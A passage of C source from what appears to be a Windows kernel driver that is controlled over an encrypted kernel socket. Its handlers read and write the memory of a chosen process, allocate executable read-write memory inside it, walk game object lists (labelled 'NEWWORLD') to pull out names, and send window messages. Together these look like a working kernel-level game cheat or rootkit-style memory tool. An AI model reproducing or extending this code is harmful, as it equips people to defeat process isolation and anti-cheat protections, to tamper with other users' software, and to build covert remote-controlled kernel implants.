		//	pValue->Error = 0x101;
		//	uSendEncrypt(pGData, s, 0x21212121, pValue, sizeof(IOINFO));
		//	FREE_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt);
		//}

	}

	return rError;
}


NTSTATUS NTAPI Brother_Process(PVOID _pGData, SOCKET s, LPIOINFO pValue) {
	NTSTATUS rError = STATUS_SUCCESS;
	Global_Data* pGData = (Global_Data*)_pGData;

	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[s];
	PKSOCKET pSocket = &pGData->wsk.bWsk.kSocket[s];

	DWORD64 Ret = 0;


	if (pValue->Type == 9)
	{

		if (pValue->pAdrSize >= MAX_PATH)
		{
			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, 0);
			pValue->Error = 1;
		}
		else
		{


			//LPCWSTR pWchar = 0;
			//do
			//{
			//	pWchar = fNtos->ExAllocatePoolWithTag(NonPagedPool, (MAX_PATH + 1) * 2, 'Tag');
			//} while (pWchar == 0);
			//fNtos->memset((char*)pWchar, 0, (MAX_PATH + 1) * 2);
			//fNtos->CopyMemory((void*)pWchar, pValue->pAdr, pValue->pAdrSize);

			//pSocketInfo->_RunApcArg.u.fMod.pUnicodeStr = pWchar;

			//wchar_t wName[MAX_PATH + 2];
			//fNtos->memset(wName, 0, sizeof(wName));
			//fNtos->CopyMemory(wName, pValue->pAdr, pValue->pAdrSize);

			//UNICODE_STRING uNameProcess;
			//fNtos->RtlInitUnicodeString(&uNameProcess, wName);

			char AName[MAX_PATH + 1];
			fNtos->memset(AName, 0, sizeof(AName));
			fNtos->CopyMemory(AName, pValue->pAdr, pValue->pAdrSize);

			STRING ANameProcess;
			ANameProcess.Buffer = AName;
			ANameProcess.Length = (USHORT)pValue->pAdrSize;
			ANameProcess.MaximumLength = ANameProcess.Length + 1;

            //fNtos->RtlInitUnicodeString(&uNameProcess, wName);

			//pSocketInfo->_RunApcArg.rBuffer = pValue;

			//pSocketInfo->_RunApcArg.rLen = sizeof(IOINFO);

			DWORD* dwPSize = (DWORD*)pValue->pVal;
			HANDLE* pProcessArry = (HANDLE *)(dwPSize + 1);

			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, 0);
			//_FUNCTION_IMP(RunApcRunCode, Ret, _pGData, s, ARG_PROCESS_PID);//FindProcessID8
			//_FUNCTION_IMP(FindProcessID8, Ret, pGData, &ANameProcess, dwPSize, pProcessArry);
			_FUNCTION_IMP(FindProcessHandle, Ret, pGData, &ANameProcess, dwPSize, pProcessArry);
			pValue->pValSize = (*dwPSize + 1) * 8;
			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, 0);
			//if (Ret == (DWORD64)-1) {

			//	_sendEncrypt uSendEncrypt = 0;
			//	_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt, _sendEncrypt);
			//	pValue->Error = 0x101;
			//	uSendEncrypt(pGData, s, 0x21212121, pValue, sizeof(IOINFO));
			//	FREE_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt);
			//}

		}
	}


	return rError;
}


#define _CopyMemory(x,y,z) uMmCopyMemoryV(pGData,s, process, x, y, (SIZE_T)z, 0)
#define _ReadMemory(x,y,z) uMmCopyMemoryV(pGData,s, process, y, x, (SIZE_T)z, 0)
#define _WriteMemory(x,y,z) uMmCopyMemoryV(pGData,s, process, x, y, (SIZE_T)z, 1)


inline ULONG  IsIsMmIsAddressValid(NTOSKRNL_FUN* fNtos, char* pAddress, DWORD nSzie) {

	if ((ULONGLONG)pAddress >= fNtos->MmUserProbeAddress) {
		return FALSE;
	}
	//ULONG nGsZ = 0;
	if (fNtos->MmIsAddressValid(pAddress) &&
		fNtos->MmIsAddressValid(pAddress + nSzie - 1))
	{
		return TRUE;
	}
	return FALSE;
}


//inline ULONG  IsIsMmIsAddressValid(NTOSKRNL_FUN* fNtos, char* pAddress, DWORD nSzie) {
//
//	if ((ULONGLONG)pAddress >= fNtos->MmUserProbeAddress) {
//		return FALSE;
//	}
//	//ULONG nGsZ = 0;
//	if (fNtos->MmIsAddressValid(pAddress) &&
//		fNtos->MmIsAddressValid(pAddress + nSzie - 1))
//	{
//		return TRUE;
//	}
//	return FALSE;
//}


NTSTATUS NTAPI Brother_Memory(PVOID _pGData, SOCKET s, LPIOINFO pValue) {

	NTSTATUS rError = STATUS_SUCCESS;
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY * AArry = &((Global_Data*)pGData)->SelfAArry;


	SOCKET_INFO * pSocket = &pGData->wsk._SocketArry[s];
	MEMORY_FLAGS MFlags_Process;
	_GetProcessEprocess uGetProcessEprocess = 0;

	_FUNCTION_ENTRY(GetProcessEprocess, MFlags_Process, _GetProcessEprocess);
	PEPROCESS process = uGetProcessEprocess(pGData, (HANDLE)pValue->pID);
	FREE_FUNCTION_ENTRY(GetProcessEprocess, MFlags_Process);

	MEMORY_FLAGS phyMFlags;
	_MmGetPhysicalAddressSelf uMmGetPhysicalAddressSelf = 0;
	_FUNCTION_ENTRY(MmGetPhysicalAddressSelf, phyMFlags, _MmGetPhysicalAddressSelf);

	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[s];
	pSocketInfo->uMmGetPhysicalAddressSelf = uMmGetPhysicalAddressSelf;

	do
	{
		
		if (process == 0) {
			rError = 5;
			break;
		}
		if (pValue->Type == KERNEL_READ || 
			pValue->Type == KERNEL_WRITE||
			pValue->Type == KERNEL_STACK_READ || 
			pValue->Type == KERNEL_STACK_WRITE) {

			DWORD64 Ret = 0;

			void* kBuffer = 0;
			if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress) {

				//if (pSocket->MemoryBuffer == 0){
				//	pSocket->MemoryBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, PAGE_SIZE, 'Tag');
				//}
				kBuffer = fNtos->ExAllocatePoolWithTag(NonPagedPool, pValue->pAdrSize, 'Tag');

				if (kBuffer == NULL) {
					//fNtos->ObfDereferenceObject(process);
					rError = 2;
					break;
				}
				if (pValue->Type == KERNEL_WRITE || 
					pValue->Type == KERNEL_STACK_WRITE) {
					fNtos->CopyMemory(kBuffer, pValue->pVal, pValue->pValSize);
				}
			}
			else {
				kBuffer = pValue->pVal;
			}

			//if (pValue->Type == KERNEL_STACK_WRITE || pValue->Type == KERNEL_STACK_READ) {
			//	return 0;
			//}

			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, 0);
			//PMDL pMdl = 0;

			if (pValue->Type < KERNEL_STACK_READ)
			{

				LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, 0);

				MEMORY_FLAGS MFlags;
				_MmCopyMemoryV uMmCopyMemoryV = 0;
				_FUNCTION_ENTRY(MmCopyMemoryV, MFlags, _MmCopyMemoryV);
				rError = (NTSTATUS)uMmCopyMemoryV(pGData, s, process, (char*)kBuffer, pValue->pAdr, (SIZE_T)pValue->pAdrSize, pValue->Type);
				FREE_FUNCTION_ENTRY(MmCopyMemoryV, MFlags);

				LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, 0);

			}
			else
			{
				//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, 0);

				MEMORY_FLAGS SafeMemoryMFlags;
				_SafeMemory uSafeMemory = 0;
				_FUNCTION_ENTRY(SafeMemory, SafeMemoryMFlags, _SafeMemory);
				KAPC_STATE Apc_State;
				fNtos->KeStackAttachProcess(process, &Apc_State);

				DWORD Type = (pValue->Type == KERNEL_STACK_READ) ? 0 : 1;
				
				if (((ULONG64)pValue->pAdr + pValue->pAdrSize) < fNtos->MmUserProbeAddress)
				{

				

				    //ZwQueryVirtualMemory

					MEMORY_BASIC_INFORMATION mbi;

					fNtos->memset(&mbi, 0, sizeof(mbi));
					SIZE_T returnLength;
					//NtQueryVirtualMemory
					if (NT_SUCCESS(fNtos->NtQueryVirtualMemory(NtCurrentProcess(), pValue->pAdr, MemoryBasicInformation, &mbi, sizeof(mbi), &returnLength)))
					{

						LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, 0, mbi.State);

						if (mbi.State != MEM_FREE)
						{
							PMDL pmdl = fNtos->IoAllocateMdl(pValue->pAdr, pValue->pAdrSize, 0, 0, NULL);
							fNtos->MmProbeAndLockPages(pmdl, UserMode, IoReadAccess);
							if (!Type)
							{
								fNtos->CopyMemory(kBuffer, pValue->pAdr, pValue->pAdrSize);
							}
							else
							{
								rError = uSafeMemory(pGData, s, pValue->pAdr, (char*)kBuffer, (SIZE_T)pValue->pAdrSize, Type);
							}
							fNtos->MmUnlockPages(pmdl);
							fNtos->IoFreeMdl(pmdl);
						}
						else{
							rError = 0x108;
						}
					}
					else
					{
						rError = 0x109;
					}
				}
				fNtos->KeUnstackDetachProcess(&Apc_State);
				FREE_FUNCTION_ENTRY(SafeMemory, SafeMemoryMFlags);
			}
			//fNtos->ObfDereferenceObject(process);
			if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress) {
				if (pValue->Type == KERNEL_READ || 
					pValue->Type == KERNEL_STACK_READ) {
					fNtos->CopyMemory(pValue->pVal, kBuffer, pValue->pAdrSize);
				}
				//fNtos->ExFreePoolWithTag(kBuffer, 'Tag');

			}
		}
		else if (pValue->Type == KERNEL_POOL) {

			//PEPROCESS process = NULL;
			KAPC_STATE stack ;

			//if (!NT_SUCCESS(fNtos->PsLookupProcessByProcessId((HANDLE)pValue->pID, &process)))
			//	return 5;

			PVOID addr = 0;
			size_t size = pValue->pAdrSize;

			NTSTATUS status = 0;
			fNtos->KeStackAttachProcess(process, &stack);
			status = fNtos->ZwAllocateVirtualMemory(ZwCurrentProcess(), &addr, 0, &size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
			if (NT_SUCCESS(status)  && addr != 0){
				fNtos->memset(addr, 0, size);
			}
			fNtos->KeUnstackDetachProcess(&stack);
			if (NT_SUCCESS(status) && addr != 0) {
				pValue->pVal = addr;
			}
		}

		if (pValue->Type >= KERNEL_READ_LIST && ((pValue->Type & 0x100) == 0))
		{



			//PEPROCESS process = NULL;

			//if (!NT_SUCCESS(fNtos->PsLookupProcessByProcessId((HANDLE)pValue->pID, &process)))
			//	return 5;

			char* kBuffer = 0;
			if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress) {


				//if (KeGetCurrentIrql() >= 2)
				//{
					kBuffer = fNtos->ExAllocatePoolWithTag(NonPagedPool, pValue->pAdrSize, 'Tag');
				//}
				//else
				//{
				//	kBuffer = fNtos->ExAllocatePoolWithTag(PagedPool, pValue->pAdrSize, 'Tag');
				//}

				//kBuffer = fNtos->ExAllocatePoolWithTag(PagedPool, pValue->pAdrSize, 'tag');
			}
			else {
				kBuffer = pValue->pVal;
			}


			if (kBuffer == NULL)
			{
				rError = 2;
				break;
				//fNtos->ObfDereferenceObject(process);
				//return 2;
			}

			MEMORY_FLAGS MFlags;
			_MmCopyMemoryV uMmCopyMemoryV = 0;
			_FUNCTION_ENTRY(MmCopyMemoryV, MFlags, _MmCopyMemoryV);


			do
			{
				if (pValue->Type == KERNEL_READ_LIST) {

					int nSize = 0;

					int ReadOffset = pValue->pAdrSize;

					//char* DBUFFER = kBuffer;

					int ReadSize = LOWORD(pValue->pValSize);

					int Readbegin = HIWORD(pValue->pValSize);

					int MaxSize = (SEND_SIZE - 12 - sizeof(IOINFO)) / ReadSize;

					//LOG_DEBUG_CODE("ReadOffset %d ReadSize %d Readbegin %d MaxSize %d\n", ReadOffset, ReadSize, Readbegin, MaxSize);



					//fNtos->KeStackAttachProcess(process, &stack);

					DWORD64 _Begin = (DWORD64)pValue->pAdr;

					DWORD64 _Next = (DWORD64)_Begin;
					do
					{
						//if (!IsIsMmIsAddressValid(fNtos, (char*)_Next, ReadSize)) {
						//	break;
						//}

						if (_CopyMemory(kBuffer + (nSize * ReadSize), (PVOID)(_Next + Readbegin), ReadSize))
						{
							break;
						}

						//fArry->SafeMemory.SelfTradition(pGData, (PVOID)(_Next + Readbegin),
						//	kBuffer + (nSize * ReadSize), ReadSize, 0);
						// 下一个指针

						if (_CopyMemory(&_Next, (PVOID)(_Next + ReadOffset), 8))
						{
							break;
						}

						//fArry->SafeMemory.SelfTradition(pGData, (PVOID)(_Next + ReadOffset), &_Next, 8, 0);
						//memcpy_s()
						if (_Next == (DWORD64)_Begin || _Next == 0 || (_Next % 4 != 0)) {
							break;
						}
						nSize++;
						if (nSize >= MaxSize) {
							break;
						}
					} while (_Next != (DWORD64)_Begin);


					//fNtos->ObfDereferenceObject(process);
					pValue->pValSize = nSize;
					pValue->pAdrSize = MaxSize;
					if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress)
					{
						fNtos->CopyMemory(pValue->pVal, kBuffer, nSize * ReadSize);
						fNtos->ExFreePoolWithTag(kBuffer, 'tag');
					}
				}
				else if (pValue->Type == KERNEL_READ_OFFSET)
				{
					int nSize = pValue->pValSize;
					DWORD* DBUFFER = (DWORD*)kBuffer;
					PVOID _Begin = (char*)pValue->pAdr;
					PVOID _Next = _Begin;
					//fNtos->


					//_MmCopyMemoryV uMmCopyMemoryV = 0;
					//_FUNCTION_ENTRY(MmCopyMemoryV, uMmCopyMemoryV, _MmCopyMemoryV);

					for (size_t i = 0; i < nSize; i++)
					{
						int cSize = i != (nSize - 1) ? 8 : pValue->pAdrSize;
						//if (!IsIsMmIsAddressValid(fNtos, (char*)((DWORD64)_Next + DBUFFER[i]), cSize)) { break; }

						if (i != (nSize - 1))
						{
							_CopyMemory(&_Next, (PVOID)((DWORD64)_Next + DBUFFER[i]), 8);
							//ReadSafeMemoryV((PVOID)((DWORD64)_Next + DBUFFER[i]), &_Next, 8);
						}
						else
						{
							_CopyMemory(kBuffer, (PVOID)((DWORD64)_Next + DBUFFER[i]), pValue->pAdrSize);
							//ReadSafeMemoryV((PVOID)((DWORD64)_Next + DBUFFER[i]), kBuffer, pValue->pAdrSize);
						}
					}

					//fNtos->ObfDereferenceObject(process);

					if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress)
					{
						fNtos->CopyMemory(pValue->pVal, kBuffer, pValue->pAdrSize);
						fNtos->ExFreePoolWithTag(kBuffer, 'tag');
					}


				}
				else if (pValue->Type == KERNEL_READ_NEWWORLD_1) {

					int MaxSize = SEND_SIZE - 12 - sizeof(IOINFO);

					DWORD64* Adr = (DWORD64*)pValue->pAdr; // 数据的起始点

					DWORD nSizeAdr = pValue->pValSize;  // 要读的数据个数

					typedef struct _SizeName {
						DWORD Begin;
						DWORD Size;
					}SizeName;

					SizeName* pSizeName = (SizeName*)kBuffer;

					ULONG NameOffset = (sizeof(SizeName)) * nSizeAdr;

					char* Name = (char*)kBuffer;

					DWORD offsetA = LOWORD(pValue->pAdrSize);

					DWORD offsetB = HIWORD(pValue->pAdrSize);

					typedef struct _ObjName_NewWorld {
						DWORD64 Val[2];
						DWORD64 Len;
						DWORD64 MaxLen;
					}ObjName_NewWorld;

					for (size_t i = 0; i < nSizeAdr; i++) {

						DWORD64 Ptr = Adr[i];
						if (!_ReadMemory((PVOID)(Ptr + offsetA), &Ptr, 8))
						{
							ObjName_NewWorld NameWorld = { 0 };
							if (!_ReadMemory((PVOID)(Ptr + offsetB), &NameWorld, sizeof(NameWorld))) {

								//ULONG gLen = NameWorld.Len & 0xFFFFFFFF;
								if (NameOffset + NameWorld.Len > MaxSize) {

									break;
								}
								if (NameWorld.MaxLen < 0x10 && NameWorld.Len < 0x10) {

									pSizeName[i].Begin = NameOffset;
									pSizeName[i].Size = (DWORD)(NameWorld.Len + 1);
									
									fNtos->CopyMemory(Name + NameOffset, &NameWorld, pSizeName[i].Size);

									NameOffset += pSizeName[i].Size;
									continue;
								}
								else if (NameWorld.Len < 0x40)
								{
									pSizeName[i].Begin = NameOffset;
									pSizeName[i].Size = (DWORD)(NameWorld.Len + 1);
									//RtlCopyMemory(Name + NameOffset, &NameWorld, pSizeName[i].Size);
									_ReadMemory((PVOID)NameWorld.Val[0], Name + NameOffset, pSizeName[i].Size);
									NameOffset += pSizeName[i].Size;
									continue;
								}
							}
						}
						pSizeName[i].Begin = NameOffset;
						pSizeName[i].Size = 1;
						fNtos->memset(Name + NameOffset, 0, 1);
						NameOffset++;
						if (NameOffset + 1 > (ULONG)MaxSize) {
							break;
						}
					}


					//fNtos->ObfDereferenceObject(process);

					pValue->pValSize = NameOffset;
					pValue->pAdrSize = NameOffset;

					if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress) {
						fNtos->CopyMemory(pValue->pVal, kBuffer, NameOffset);
						fNtos->ExFreePoolWithTag(kBuffer, 'tag');
					}

				}
				else if (pValue->Type == KERNEL_READ_NEWWORLD_2) {

					//char* DBUFFER = kBuffer;

					int MaxSize = SEND_SIZE - 12 - sizeof(IOINFO);

					DWORD64* Adr = (DWORD64*)pValue->pAdr; // 数据的起始点

					DWORD nSizeAdr = pValue->pValSize;  // 要读的数据个数

					typedef struct _SizeName {
						DWORD Begin;
						DWORD Size;
					}SizeName;

					SizeName* pSizeName = (SizeName*)kBuffer;

					ULONG NameOffset = (sizeof(SizeName)) * nSizeAdr;

					char* Name = (char*)kBuffer;

					for (size_t i = 0; i < nSizeAdr; i++) {

						DWORD64 Ptr = Adr[i];



						if (!_ReadMemory((PVOID)Ptr, &Ptr, 8))
						{
							DWORD64 GetComponentNameAddr = 0;

							if (!_ReadMemory((PVOID)(Ptr + 8), &GetComponentNameAddr, 8)) {

								DWORD componentNameOffset = 0;
								if (!_ReadMemory((PVOID)(GetComponentNameAddr + 3), &componentNameOffset, 4)) 
								{
									DWORD64 cn = GetComponentNameAddr + 7 + componentNameOffset;
									char tName[0x42];
									fNtos->memset(tName, 0, 0x42);
									if (!_ReadMemory((PVOID)cn, tName, 0x40)) {

										int Size = (int)fNtos->strnlen(tName, 0x42);

										pSizeName[i].Begin = NameOffset;
										pSizeName[i].Size = Size + 1;
										fNtos->CopyMemory(Name + NameOffset, tName, pSizeName[i].Size);
										NameOffset += pSizeName[i].Size;
										continue;
									}

								}
							}
						}
						pSizeName[i].Begin = NameOffset;
						pSizeName[i].Size = 1;
						fNtos->memset(Name + NameOffset, 0, 1);
						NameOffset++;
						if (NameOffset + 1 > (ULONG)MaxSize) {
							break;
						}
					}

					//fNtos->ObfDereferenceObject(process);

					pValue->pValSize = NameOffset;
					pValue->pAdrSize = NameOffset;

					if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress) {
						fNtos->CopyMemory(pValue->pVal, kBuffer, NameOffset);
						fNtos->ExFreePoolWithTag(kBuffer, 'tag');
					}

				}
				else if (pValue->Type == KERNEL_READ_NEWWORLD_3) {


					int MaxSize = SEND_SIZE - 12 - sizeof(IOINFO);


					DWORD64* Adr = (DWORD64*)pValue->pAdr; // 数据的起始点

					DWORD nSizeAdr = pValue->pValSize;  // 要读的数据个数

					typedef struct _SizeName {
						DWORD Begin;
						DWORD Size;
					}SizeName;

					SizeName* pSizeName = (SizeName*)kBuffer;

					ULONG NameOffset = (sizeof(SizeName)) * nSizeAdr;

					char* Name = (char*)kBuffer;

					DWORD offsetA = LOWORD(pValue->pAdrSize);

					DWORD offsetB = HIWORD(pValue->pAdrSize);

					typedef struct _ObjName_NewWorld {
						DWORD64 Val[2];
						DWORD64 Len;
						DWORD64 MaxLen;
					}ObjName_NewWorld;



					for (size_t i = 0; i < nSizeAdr; i++) {

						DWORD64 Ptr = Adr[i];


						ObjName_NewWorld NameWorld;
						if (!_ReadMemory((PVOID)(Ptr + offsetA), &NameWorld, sizeof(NameWorld))) {

							//ULONG gLen = NameWorld.Len & 0xFFFFFFFF;
							if (NameOffset + NameWorld.Len > MaxSize) {

								break;
							}
							if (NameWorld.MaxLen < 0x10 && NameWorld.Len < 0x10) {

								pSizeName[i].Begin = NameOffset;
								pSizeName[i].Size = (DWORD)(NameWorld.Len + 1);
								RtlCopyMemory(Name + NameOffset, &NameWorld, pSizeName[i].Size);
								NameOffset += pSizeName[i].Size;
								continue;
							}
							else if (NameWorld.Len < 0x40)
							{
								pSizeName[i].Begin = NameOffset;
								pSizeName[i].Size = (DWORD)(NameWorld.Len + 1);
								//RtlCopyMemory(Name + NameOffset, &NameWorld, pSizeName[i].Size);
								_ReadMemory((PVOID)NameWorld.Val[0], Name + NameOffset, pSizeName[i].Size);
								NameOffset += pSizeName[i].Size;
								continue;
							}
						}
						pSizeName[i].Begin = NameOffset;
						pSizeName[i].Size = 1;
						fNtos->memset(Name + NameOffset, 0, 1);
						//RtlZeroMemory(Name + NameOffset, 1);
						NameOffset++;
						if (NameOffset + 1 > (ULONG)MaxSize) {
							break;
						}
					}



					//fNtos->ObfDereferenceObject(process);

					pValue->pValSize = NameOffset;
					pValue->pAdrSize = NameOffset;

					if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress) {
						fNtos->CopyMemory(pValue->pVal, kBuffer, NameOffset);
						fNtos->ExFreePoolWithTag(kBuffer, 'tag');
					}

				}
				else if (pValue->Type == KERNEL_READ_MEMORY_0) {



					DWORD MaxSize = SEND_SIZE - 12 - sizeof(IOINFO);


					DWORD64* Adr = (DWORD64*)pValue->pAdr; // 数据的起始点

					DWORD nSizeAdr = pValue->pValSize;  // 要读的数据个数

					typedef struct _SizeName {
						DWORD Begin;
						DWORD Size;
					}SizeName;

					SizeName* pSizeName = (SizeName*)kBuffer;

					ULONG NameOffset = (sizeof(SizeName)) * nSizeAdr;

					char* Name = (char*)kBuffer;

					DWORD nStructSize = LOWORD(pValue->pAdrSize);

					///DWORD offsetB = HIWORD(pValue->pAdrSize);

					if (NameOffset + nStructSize * nSizeAdr > MaxSize) {


						if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress)
						{
							fNtos->ExFreePoolWithTag(kBuffer, 'tag');
						}
						//fNtos->ObfDereferenceObject(process);
						rError = 3;
						break;
						//return 3;
					}


					for (size_t i = 0; i < nSizeAdr; i++) {

						DWORD64 Ptr = Adr[i];

						if (NameOffset + pSizeName[i].Size > MaxSize) {

							break;
						}

						pSizeName[i].Begin = NameOffset;
						pSizeName[i].Size = nStructSize;
						_ReadMemory((PVOID)(Ptr), Name + NameOffset, pSizeName[i].Size);
						NameOffset += pSizeName[i].Size;
					}

					//fNtos->ObfDereferenceObject(process);

					pValue->pValSize = NameOffset;
					pValue->pAdrSize = NameOffset;

					if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress) {
						fNtos->CopyMemory(pValue->pVal, kBuffer, NameOffset);
						fNtos->ExFreePoolWithTag(kBuffer, 'tag');
					}

				}
				else if (pValue->Type == KERNEL_READ_MEMORY_1) {


					//char* DBUFFER = kBuffer;

					int MaxSize = SEND_SIZE - 12 - sizeof(IOINFO);


					typedef struct _Irregular {
						DWORD64 Ptr;
						DWORD64 nSize;
					}Irregular;


					Irregular* Adr = (Irregular*)pValue->pAdr; // 数据的起始点

					DWORD nSizeAdr = pValue->pValSize;  // 要读的数据个数

					typedef struct _SizeName {
						DWORD Begin;
						DWORD Size;
					}SizeName;

					SizeName* pSizeName = (SizeName*)kBuffer;

					ULONG NameOffset = (sizeof(SizeName)) * nSizeAdr;

					char* Name = (char*)kBuffer;

					for (size_t i = 0; i < nSizeAdr; i++) {

						if (NameOffset + (Adr[i].nSize & 0xFFFF) > MaxSize) {
							break;
						}
						DWORD64 Ptr = Adr[i].Ptr;
						pSizeName[i].Begin = NameOffset;
						pSizeName[i].Size = (Adr[i].nSize & 0xFFFF);
						_ReadMemory((PVOID)(Ptr), Name + NameOffset, pSizeName[i].Size);
						NameOffset += pSizeName[i].Size;
					}

					//fNtos->ObfDereferenceObject(process);

					pValue->pValSize = NameOffset;
					pValue->pAdrSize = NameOffset;

					if ((ULONG64)pValue->pVal < fNtos->MmUserProbeAddress) {
						fNtos->CopyMemory(pValue->pVal, kBuffer, NameOffset);
						fNtos->ExFreePoolWithTag(kBuffer, 'tag');
					}


				}
			} while (0);



			FREE_FUNCTION_ENTRY(MmCopyMemoryV, MFlags);

		}


	} while (0);


	FREE_FUNCTION_ENTRY(MmGetPhysicalAddressSelf, phyMFlags);
	//if (phyMFlags.Flags == 2) { fNtos->MmFreeContiguousMemory(phyMFlags.Ptr); }
	//else { fNtos->MmFreeNonCachedMemory(phyMFlags.Ptr, fArry->MmGetPhysicalAddressSelf.nPageSize); }
	//pSocketInfo->uMmGetPhysicalAddressSelf = 0;

	return rError;

}

NTSTATUS NTAPI Brother_Window(PVOID _pGData, SOCKET s, LPIOINFO pValue) {


	NTSTATUS rError = STATUS_SUCCESS;
	Global_Data* pGData = (Global_Data*)_pGData;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)_pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)_pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)_pGData)->SelfAArry;


	SOCKET_INFO* pSocketInfo = &pGData->wsk._SocketArry[s];
	PKSOCKET pSocket = &pGData->wsk.bWsk.kSocket[s];


	//LOG_DEBUG("Brother_Window PID:%d Type :%08X  pValSize: %08X\n", pValue->pID, pValue->Type, pValue->pValSize);

	//if (pValue->Type == 0)
	//{
	//	//LOG_DEBUG("Brother_Window PID:%d Type :%08X  HNWD:%08X\n", pValue->pID, pValue->pValSize);
	//	AddForeHwnd((HANDLE)pValue->pID, (HANDLE)pValue->pValSize);
	//	pValue->Error = 0;
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 1)
	//{
	//	BRPOINT p;
	//	RtlCopyMemory(&p, &pValue->pAdr, sizeof(p));
	//	AddFixPoint((HANDLE)pValue->pID, p, 1);
	//	pValue->Error = 0;
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 2)
	//{
	//	StopFixPoint((HANDLE)pValue->pID);
	//	pValue->Error = 0;
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 3)
	//{
	//	BRPOINT p;
	//	RtlCopyMemory(&p, &pValue->pAdr, sizeof(p));
	//	AddFixPoint((HANDLE)pValue->pID, p, 2);
	//	pValue->Error = 0;
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 4)
	//{
	//	StopFixPoint((HANDLE)pValue->pID);
	//	pValue->Error = 0;
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 5)
	//{
	//	pValue->pAdrSize = (DWORD)(DWORD64)GetForegroundWindow();
	//	pValue->Error = 0;
	//	return STATUS_SUCCESS;
	//}
	//else if (pValue->Type == 6) {
	//	//StopFixPoint((HANDLE)pValue->pID);
	//	pValue->pAdrSize = SetForegroundWindow((HWND)pValue->pAdrSize);
	//	pValue->Error = 0;
	//	return STATUS_SUCCESS;
	//}
	//else 

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pValue, pValue->Type);


	//if (pValue->Type > 4 )
	//{
		WORKER_THREAD_INFO* pWorkInfo = &pSocketInfo->Worker;
		DWORD64 Ret = 0;

		RUN_APC_ARG* Arg = &pSocketInfo->_RunApcArg[0];

		if (pValue->Type == 5){
			pWorkInfo->Flags = ARG_NtUserGetForegroundWindow;
		}
		else if (pValue->Type == 6) {

			Arg->u.Hwnd = (HWND)pValue->pAdrSize;
			pWorkInfo->Flags = ARG_NtUserCallHwndLock;
		}
		else if (pValue->Type == 7) {
			
			fNtos->RtlInitUnicodeString(&Arg->u.fWindows.lpClassName, (PCWSTR)pValue->pAdr);
			fNtos->RtlInitUnicodeString(&Arg->u.fWindows.lpWindowName, (PCWSTR)pValue->pVal);
			pWorkInfo->Flags = ARG_NtUserFindWindowEx;


		}
		else if (pValue->Type == 8) {
			




		}
		else if (pValue->Type == 9) {

			Arg->u.fPoint.Hwnd = (HWND)pValue->pAdrSize;
			Arg->u.fPoint.pPoint = (LPPOINT)pValue->pVal;
			pWorkInfo->Flags = ARG_ClientToSccreen;
		}
		else if (pValue->Type == 13) {

			Arg->u.Msg.hWnd = (HWND)pValue->pAdrSize;
			Arg->u.Msg.Msg = pValue->pValSize;
			Arg->u.Msg.wParam = (LONG_PTR)pValue->pAdr;
			Arg->u.Msg.lParam = (LONG_PTR)pValue->pVal;

			Arg->rBuffer = pValue;
			Arg->rLen = sizeof(IOINFO);

			//WORKER_THREAD_INFO* pWorkInfo = &pSocketInfo->Worker;
			pWorkInfo->Flags = ARG_PostMessage;
		}
		else if (pValue->Type == 14) {


			pWorkInfo->Flags = ARG_NtUserEnumDisplaySettings;

			//StopFixPoint((HANDLE)pValue->pID);
			//DEVMODEW DevMod = { 0 };
			//if (EnumDisplaySettingsExW(NULL, -1, &DevMod, 0) > 0) {
			//	LOG_DEBUG("EnumDisplaySettingsExW  r %d  %d\n", DevMod.dmPelsWidth, DevMod.dmPelsHeight);

			//	pValue->pAdrSize = DevMod.dmPelsWidth;
			//	pValue->pValSize = DevMod.dmPelsHeight;
			//}
			//return STATUS_SUCCESS;
		}
		else if (pValue->Type == 15) {
			//PAGE_READ
			//pValue->Error = ClientToScreen_User((HWND)pValue->pAdrSize, (LPPOINT)pValue->pVal);
			//return STATUS_SUCCESS;
		}


		Arg->rBuffer = pValue;
		Arg->rLen = sizeof(IOINFO);

		Arg->s = s;
		Arg->RunCode = pWorkInfo->Flags;



